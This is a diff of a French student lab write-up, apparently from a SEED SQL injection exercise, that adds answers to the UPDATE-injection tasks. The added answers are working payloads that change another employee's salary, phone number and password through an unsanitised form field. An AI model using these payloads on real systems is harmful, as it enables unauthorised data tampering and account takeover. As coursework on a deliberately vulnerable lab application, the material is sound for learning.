@@ -98,12 +98,19 @@ de votre attaque ?
 > Ajouter une contrainte sur la page loggin, par exemple, il n'y a que les chifferes sont acceptes.
 
 ## Injection SQL (update)
-1. Réaliser une injection sql qui permet à Ryan de modifier son salaire. Pour cette
-on connait l’ID de Ryan (30000) ainsi que son mot de passe (seedryan).
+1. Réaliser une injection sql qui permet à Ryan de modifier son salaire. Pour cette on connait l’EID de Ryan (30000) ainsi que son mot de passe (seedryan).
 
 ```sql
-
+Ryan' , Salary=100 WHERE EID=30000;#
 ```
-2. Réaliser une injection sql qui permet à Alice de modifier de numéro de téléphone
-de Ryan.
+![](cr_update_31.png)
+2. Réaliser une injection sql qui permet à Alice de modifier de numéro de téléphone de Ryan.
+```sql
+Ryan', PhoneNumber = '00000000' WHERE Name='Ryan';#
+```
+![](cr_update_32.png)
 3. Est-ce que Alice peut modifier le mot de passe de Ryan ?
+```sql
+# executer dans le inputtext de password'
+Ryan',Password = 'pwd' WHERE EID=30000;#
+```
